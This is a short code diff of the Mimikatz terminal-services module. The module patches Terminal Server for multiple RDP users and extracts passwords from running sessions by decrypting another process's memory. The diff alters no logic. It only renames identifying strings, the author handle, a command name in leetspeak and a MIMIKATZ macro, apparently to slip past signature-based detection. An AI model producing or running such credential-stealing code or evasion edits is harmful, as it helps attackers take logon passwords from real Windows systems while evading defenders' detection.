@@ -1,12 +1,12 @@
-/*	Benjamin DELPY `gentilkiwi`
-	https://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
+/*	Benjamin DELPY `FYtD`
+	https://blog.FYtD.com
+	benjamin@FYtD.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_ts.h"
 
 const KUHL_M_C kuhl_m_c_ts[] = {
-	{kuhl_m_ts_multirdp,	L"multirdp",	L"[experimental] patch Terminal Server service to allow multiples users"},
+	{kuhl_m_ts_multirdp,	L"mUlt1Rdp",	L"[experimental] patch Terminal Server service to allow multiples users"},
 	{kuhl_m_ts_sessions,	L"sessions",	NULL},
 	{kuhl_m_ts_remote,		L"remote",		NULL},
 	{kuhl_m_ts_logonpasswords, L"logonpasswords", L"[experimental] try to get passwords from running sessions"},
@@ -253,7 +253,7 @@ BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION 
 											pKiwiData->cbUsername / sizeof(wchar_t), pKiwiData->UserName
 											);
 
-										if(pKiwiData->cbPassword && (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10))
+										if(pKiwiData->cbPassword && (EARDOGZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10))
 										{
 											decStatus = kull_m_crypto_remote_CryptUnprotectMemory(aProcess.hMemory, pKiwiData->Password, sizeof(pKiwiData->Password), CRYPTPROTECTMEMORY_SAME_PROCESS);
 										}
